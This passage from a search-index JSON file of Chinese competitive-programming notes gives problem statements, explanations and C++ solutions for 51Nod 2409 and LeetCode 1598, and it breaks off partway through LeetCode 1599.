\u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#12-problem-description","text":"\u8bfb\u5165 N \uff0c\u6c42\u51fa 1..N \u7684\u8303\u56f4\u5185\u6240\u6709 2 \u6216 3 \u6216 5 \u7684\u500d\u6570\u4e00\u5171\u6709\u591a\u5c11\u4e2a\uff1f","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#13-input","text":"\u8f93\u5165\u4e00\u4e2a\u6570 N","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#14-output","text":"\u8f93\u51fa\u4e00\u4e2a\u6570\uff0c\u8868\u793a\u8fd9\u6837\u7684\u6570\u7684\u4e2a\u6570","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#15-sample-input","text":"10","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#16-sample-output","text":"8","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#17-source","text":"51Nod 2409 \u542f\u8499\u7ec3\u4e60-\u500d\u6570\u7684\u4e2a\u6570","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#2","text":"\u627e\u51fa [1, n] \u8303\u56f4\u5185 2\u30013\u30015 \u7684\u500d\u6570\uff0c\u4e3a\u53bb\u9664\u91cd\u590d\u8ba1\u6570\uff0c\u51cf\u53bb\u4ed6\u4eec\u4e24\u4e24\u7ec4\u5408\u6784\u6210\u7684\u5171\u540c\u7684\u500d\u6570\uff0c\u5373 [1, n] \u8303\u56f4\u5185 6\u300110\u300115 \u7684\u500d\u6570\u3002 \u56e0\u4e3a\u51cf\u53bb\u4e86\u4e24\u4e24\u7ec4\u5408\u7684\u500d\u6570\uff0c\u4e09\u4e2a\u6570\u5b57\u76f8\u4e58\u7684\u500d\u6570\uff0c\u5373 30 \u7684\u500d\u6570\u88ab\u51cf\u6389\u4e86\uff0c\u6240\u4ee5\u518d\u52a0\u4e0a 30 \u7684\u500d\u6570\uff0c\u5373\u53ef\u5f97\u51fa\u7b54\u6848\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#3","text":"#include <iostream> using namespace std; int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u627e\u51fa[1, n]\u8303\u56f4\u51852\u30013\u30015\u7684\u500d\u6570 long long nDivBy2 = n / 2l; long long nDivBy3 = n / 3l; long long nDivBy5 = n / 5l; // \u627e\u51fa[1, n]\u8303\u56f4\u51856\u300110\u300115\u300130\u7684\u500d\u6570 long long nDivBy6 = n / 6l; long long nDivBy10 = n / 10l; long long nDivBy15 = n / 15l; long long nDivBy30 = n / 30l; long long ans = nDivBy2 + nDivBy3 + nDivBy5 - nDivBy6 - nDivBy10 - nDivBy15 + nDivBy30; // \u8f93\u51fa printf(\"%lld\\n\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/","text":"LeetCode 1598 \u6587\u4ef6\u5939\u64cd\u4f5c\u65e5\u5fd7\u641c\u96c6\u5668 # \u76ee\u5f55 # LeetCode 1598 \u6587\u4ef6\u5939\u64cd\u4f5c\u65e5\u5fd7\u641c\u96c6\u5668 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u6bcf\u5f53\u7528\u6237\u6267\u884c\u53d8\u66f4\u6587\u4ef6\u5939\u64cd\u4f5c\u65f6\uff0cLeetCode \u6587\u4ef6\u7cfb\u7edf\u90fd\u4f1a\u4fdd\u5b58\u4e00\u6761\u65e5\u5fd7\u8bb0\u5f55\u3002 \u4e0b\u9762\u7ed9\u51fa\u5bf9\u53d8\u66f4\u64cd\u4f5c\u7684\u8bf4\u660e\uff1a \"../\" \uff1a\u79fb\u52a8\u5230\u5f53\u524d\u6587\u4ef6\u5939\u7684\u7236\u6587\u4ef6\u5939\u3002\u5982\u679c\u5df2\u7ecf\u5728\u4e3b\u6587\u4ef6\u5939\u4e0b\uff0c\u5219 \u7ee7\u7eed\u505c\u7559\u5728\u5f53\u524d\u6587\u4ef6\u5939 \u3002 \"./\" \uff1a\u7ee7\u7eed\u505c\u7559\u5728\u5f53\u524d\u6587\u4ef6\u5939\u3002 \"x/\" \uff1a\u79fb\u52a8\u5230\u540d\u4e3a x \u7684\u5b50\u6587\u4ef6\u5939\u4e2d\u3002\u9898\u76ee\u6570\u636e \u4fdd\u8bc1\u603b\u662f\u5b58\u5728\u6587\u4ef6\u5939 x \u3002 \u7ed9\u4f60\u4e00\u4e2a\u5b57\u7b26\u4e32\u5217\u8868 logs \uff0c\u5176\u4e2d logs[i] \u662f\u7528\u6237\u5728 i^{th} \u6b65\u6267\u884c\u7684\u64cd\u4f5c\u3002 \u6587\u4ef6\u7cfb\u7edf\u542f\u52a8\u65f6\u4f4d\u4e8e\u4e3b\u6587\u4ef6\u5939\uff0c\u7136\u540e\u6267\u884c logs \u4e2d\u7684\u64cd\u4f5c\u3002 \u6267\u884c\u5b8c\u6240\u6709\u53d8\u66f4\u6587\u4ef6\u5939\u64cd\u4f5c\u540e\uff0c\u8bf7\u4f60\u627e\u51fa \u8fd4\u56de\u4e3b\u6587\u4ef6\u5939\u6240\u9700\u7684\u6700\u5c0f\u6b65\u6570 \u3002 1.3. Sample Input 1 # \u8f93\u5165\uff1alogs = [\"d1/\",\"d2/\",\"../\",\"d21/\",\"./\"] 1.4. Sample Output 1 # \u8f93\u51fa\uff1a2 \u89e3\u91ca\uff1a\u6267\u884c \"../\" \u64cd\u4f5c\u53d8\u66f4\u6587\u4ef6\u5939 2 \u6b21\uff0c\u5373\u53ef\u56de\u5230\u4e3b\u6587\u4ef6\u5939 1.5. Sample Input 2 # \u8f93\u5165\uff1alogs = [\"d1/\",\"d2/\",\"./\",\"d3/\",\"../\",\"d31/\"] 1.6. Sample Output 2 # \u8f93\u51fa\uff1a3 1.7. Source # LeetCode 1598 \u6587\u4ef6\u5939\u64cd\u4f5c\u65e5\u5fd7\u641c\u96c6\u5668 2. \u89e3\u8bfb # \u7b80\u5355\u9898\uff0c\u9047\u5230 ../ \u65f6\u6587\u4ef6\u5939\u6df1\u5ea6\u51cf1\uff0c\u6587\u4ef6\u5939\u6df1\u5ea6\u4e3a0\u65f6\u4e0d\u518d\u51cf\u5c11\uff0c\u9047\u5230 x/ \u65f6\u6df1\u5ea6\u52a0\u4e00\u3002 3. \u4ee3\u7801 # class Solution { public: int minOperations(vector<string>& logs) { int ans = 0; size_t len = logs.size(); for (size_t i = 0; i < len; i++) { if (logs[i] == \"../\") { ans = max(ans - 1, 0); } else if (logs[i] == \"./\") { // do nothing } else { ans++; } } return ans; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://blog.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"10.LeetCode 1598 \u6587\u4ef6\u5939\u64cd\u4f5c\u65e5\u5fd7\u641c\u96c6\u5668"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#leetcode-1598","text":"","title":"LeetCode 1598 \u6587\u4ef6\u5939\u64cd\u4f5c\u65e5\u5fd7\u641c\u96c6\u5668"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#_1","text":"LeetCode 1598 \u6587\u4ef6\u5939\u64cd\u4f5c\u65e5\u5fd7\u641c\u96c6\u5668 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#12-problem-description","text":"\u6bcf\u5f53\u7528\u6237\u6267\u884c\u53d8\u66f4\u6587\u4ef6\u5939\u64cd\u4f5c\u65f6\uff0cLeetCode \u6587\u4ef6\u7cfb\u7edf\u90fd\u4f1a\u4fdd\u5b58\u4e00\u6761\u65e5\u5fd7\u8bb0\u5f55\u3002 \u4e0b\u9762\u7ed9\u51fa\u5bf9\u53d8\u66f4\u64cd\u4f5c\u7684\u8bf4\u660e\uff1a \"../\" \uff1a\u79fb\u52a8\u5230\u5f53\u524d\u6587\u4ef6\u5939\u7684\u7236\u6587\u4ef6\u5939\u3002\u5982\u679c\u5df2\u7ecf\u5728\u4e3b\u6587\u4ef6\u5939\u4e0b\uff0c\u5219 \u7ee7\u7eed\u505c\u7559\u5728\u5f53\u524d\u6587\u4ef6\u5939 \u3002 \"./\" \uff1a\u7ee7\u7eed\u505c\u7559\u5728\u5f53\u524d\u6587\u4ef6\u5939\u3002 \"x/\" \uff1a\u79fb\u52a8\u5230\u540d\u4e3a x \u7684\u5b50\u6587\u4ef6\u5939\u4e2d\u3002\u9898\u76ee\u6570\u636e \u4fdd\u8bc1\u603b\u662f\u5b58\u5728\u6587\u4ef6\u5939 x \u3002 \u7ed9\u4f60\u4e00\u4e2a\u5b57\u7b26\u4e32\u5217\u8868 logs \uff0c\u5176\u4e2d logs[i] \u662f\u7528\u6237\u5728 i^{th} \u6b65\u6267\u884c\u7684\u64cd\u4f5c\u3002 \u6587\u4ef6\u7cfb\u7edf\u542f\u52a8\u65f6\u4f4d\u4e8e\u4e3b\u6587\u4ef6\u5939\uff0c\u7136\u540e\u6267\u884c logs \u4e2d\u7684\u64cd\u4f5c\u3002 \u6267\u884c\u5b8c\u6240\u6709\u53d8\u66f4\u6587\u4ef6\u5939\u64cd\u4f5c\u540e\uff0c\u8bf7\u4f60\u627e\u51fa \u8fd4\u56de\u4e3b\u6587\u4ef6\u5939\u6240\u9700\u7684\u6700\u5c0f\u6b65\u6570 \u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#13-sample-input-1","text":"\u8f93\u5165\uff1alogs = [\"d1/\",\"d2/\",\"../\",\"d21/\",\"./\"]","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#14-sample-output-1","text":"\u8f93\u51fa\uff1a2 \u89e3\u91ca\uff1a\u6267\u884c \"../\" \u64cd\u4f5c\u53d8\u66f4\u6587\u4ef6\u5939 2 \u6b21\uff0c\u5373\u53ef\u56de\u5230\u4e3b\u6587\u4ef6\u5939","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#15-sample-input-2","text":"\u8f93\u5165\uff1alogs = [\"d1/\",\"d2/\",\"./\",\"d3/\",\"../\",\"d31/\"]","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#16-sample-output-2","text":"\u8f93\u51fa\uff1a3","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#17-source","text":"LeetCode 1598 \u6587\u4ef6\u5939\u64cd\u4f5c\u65e5\u5fd7\u641c\u96c6\u5668","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#2","text":"\u7b80\u5355\u9898\uff0c\u9047\u5230 ../ \u65f6\u6587\u4ef6\u5939\u6df1\u5ea6\u51cf1\uff0c\u6587\u4ef6\u5939\u6df1\u5ea6\u4e3a0\u65f6\u4e0d\u518d\u51cf\u5c11\uff0c\u9047\u5230 x/ \u65f6\u6df1\u5ea6\u52a0\u4e00\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/10.LeetCode_1598_%E6%96%87%E4%BB%B6%E5%A4%B9%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E6%90%9C%E9%9B%86%E5%99%A8/#3","text":"class Solution { public: int minOperations(vector<string>& logs) { int ans = 0; size_t len = logs.size(); for (size_t i = 0; i < len; i++) { if (logs[i] == \"../\") { ans = max(ans - 1, 0); } else if (logs[i] == \"./\") { // do nothing } else { ans++; } } return ans; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://blog.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/11.Leetcode_1599_%E7%BB%8F%E8%90%A5%E6%91%A9%E5%A4%A9%E8%BD%AE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/","text":"Leetcode 1599 \u7ecf\u8425\u6469\u5929\u8f6e\u7684\u6700\u5927\u5229\u6da6 # \u76ee\u5f55 # Leetcode 1599 \u7ecf\u8425\u6469\u5929\u8f6e\u7684\u6700\u5927\u5229\u6da6 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u4f60\u6b63\u5728\u7ecf\u8425\u4e00\u5ea7\u6469\u5929\u8f6e\uff0c\u8be5\u6469\u5929\u8f6e\u5171\u6709 4 \u4e2a\u5ea7\u8231 \uff0c\u6bcf\u4e2a\u5ea7\u8231 \u6700\u591a\u53ef\u4ee5\u5bb9\u7eb3 4 \u4f4d\u6e38\u5ba2 \u3002\u4f60\u53ef\u4ee5 \u9006\u65f6\u9488 \u8f6e\u8f6c\u5ea7\u8231\uff0c\u4f46\u6bcf\u6b21\u8f6e\u8f6c\u90fd\u9700\u8981\u652f\u4ed8\u4e00\u5b9a\u7684\u8fd0\u884c\u6210\u672c runningCost \u3002\u6469\u5929\u8f6e\u6bcf\u6b21\u8f6e\u8f6c\u90fd\u6070\u597d\u8f6c\u52a8 1 / 4 \u5468\u3002 \u7ed9\u4f60\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u6570\u7ec4 customers \uff0c customers[i] \u662f\u5728\u7b2c i \u6b21\u8f6e\u8f6c\uff08\u4e0b\u6807\u4ece 0 \u5f00\u59cb\uff09\u4e4b\u524d\u5230\u8fbe\u7684\u65b0\u6e38\u5ba2\u7684\u6570\u91cf\u3002\u8fd9\u4e5f\u610f\u5473\u7740\u4f60\u5fc5\u987b\u5728\u65b0\u6e38\u5ba2\u5230\u6765\u524d\u8f6e\u8f6c i \u6b21\u3002\u6bcf\u4f4d\u6e38\u5ba2\u5728\u767b\u4e0a\u79bb\u5730\u9762\u6700\u8fd1\u7684\u5ea7\u8231\u524d\u90fd\u4f1a\u652f\u4ed8\u767b\u8231\u6210\u672c boardingCost \uff0c\u4e00\u65e6\u8be5\u5ea7\u8231\u518d\u6b21\u62b5\u8fbe\u5730\u9762\uff0c\u4ed6\u4eec\u5c31\u4f1a\u79bb\u5f00\u5ea7\u8231\u7ed3\u675f\u6e38\u73a9\u3002 \u4f60\u53ef\u4ee5\u968f\u65f6\u505c\u4e0b\u6469\u5929\u8f6e\uff0c\u5373\u4fbf\u662f \u5728\u670d\u52a1\u6240\u6709\u6e38\u5ba2\u4e4b\u524d \u3002\u5982\u679c\u4f60\u51b3\u5b9a\u505c\u6b62\u8fd0\u8425\u6469\u5929\u8f6e\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6240\u6709\u6e38\u5ba2\u5b89\u5168\u7740\u9646\uff0c\u5c06\u514d\u8d39\u8fdb\u884c\u6240\u6709\u540e\u7eed\u8f6e\u8f6c \u3002\u6ce8\u610f\uff0c\u5982\u679c\u6709\u8d85\u8fc7 4 \u4f4d\u6e38\u5ba2\u5728\u7b49\u6469\u5929\u8f6e\uff0c\u90a3\u4e48\u53ea\u6709 4 \u4f4d\u6e38\u5ba2\u53ef\u4ee5\u767b\u4e0a\u6469\u5929\u8f6e\uff0c\u5176\u4f59\u7684\u9700\u8981\u7b49\u5f85 \u4e0b\u4e00\u6b21\u8f6e\u8f6c \u3002 \u8fd4\u56de\u6700\u5927\u5316\u5229\u6da6\u6240\u9700\u6267\u884c\u7684 \u6700\u5c0f\u8f6e\u8f6c\u6b21\u6570 \u3002 \u5982\u679c\u4e0d\u5b58\u5728\u5229\u6da6\u4e3a\u6b63\u7684\u65b9\u6848\uff0c\u5219\u8fd4\u56de -1 \u3002 1.3. Sample Input 1 # \u8f93\u5165\uff1acustomers = [8,3], boardingCost = 5, runningCost = 6 1.4. Sample Output 1 # \u8f93\u51fa\uff1a3 \u89e3\u91ca\uff1a\u5ea7\u8231\u4e0a\u6807\u6ce8\u7684\u6570\u5b57\u662f\u8be5\u5ea7\u8231\u7684\u5f53\u524d\u6e38\u5ba2\u6570\u3002 1. 8 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u767b\u8231\uff0c4 \u4f4d\u7b49\u5f85\u4e0b\u4e00\u8231\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 4 * $5 - 1 * $6 = $14 \u3002 2. 3 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u5728\u7b49\u5f85\u7684\u6e38\u5ba2\u767b\u8231\uff0c\u5176\u4ed6 3 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 8 * $5 - 2 * $6 = $28 \u3002 3. \u6700\u540e 3 \u4f4d\u6e38\u5ba2\u767b\u8231\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 11 * $5 - 3 * $6 = $37 \u3002 \u8f6e\u8f6c 3 \u6b21\u5f97\u5230\u6700\u5927\u5229\u6da6\uff0c\u6700\u5927\u5229\u6da6\u4e3a $37 \u3002 1.5. Sample Input 2 # \u8f93\u5165\uff1acustomers = [10,9,6], boardingCost = 6, runningCost = 4 1.6. Sample Output 2 # \u8f93\u51fa\uff1a7 \u89e3\u91ca\uff1a 1. 10 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u767b\u8231\uff0c6 \u4f4d\u7b49\u5f85\u4e0b\u4e00\u8231\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 4 * $6 - 1 * $4 = $20 \u3002 2. 9 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u767b\u8231\uff0c11 \u4f4d\u7b49\u5f85\uff082 \u4f4d\u662f\u5148\u524d\u5c31\u5728\u7b49\u5f85\u7684\uff0c9 \u4f4d\u65b0\u52a0\u5165\u7b49\u5f85\u7684\uff09\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 8 * $6 - 2 * $4 = $40 \u3002 3. \u6700\u540e 6 \u4f4d\u6e38\u5ba2\u62b5\u8fbe\uff0c4 \u4f4d\u767b\u8231\uff0c13 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 12 * $6 - 3 * $4 = $60 \u3002 4. 4 \u4f4d\u767b\u8231\uff0c9 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a * $6 - 4 * $4 = $80 \u3002 5. 4 \u4f4d\u767b\u8231\uff0c5 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 20 * $6 - 5 * $4 = $100 \u3002 6. 4 \u4f4d\u767b\u8231\uff0c1 \u4f4d\u7b49\u5f85\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 24 * $6 - 6 * $4 = $120 \u3002 7. 1 \u4f4d\u767b\u8231\uff0c\u6469\u5929\u8f6e\u8f6e\u8f6c\u3002\u5f53\u524d\u5229\u6da6\u4e3a 25 * $6 - 7 * $4 = $122 \u3002 \u8f6e\u8f6c 7 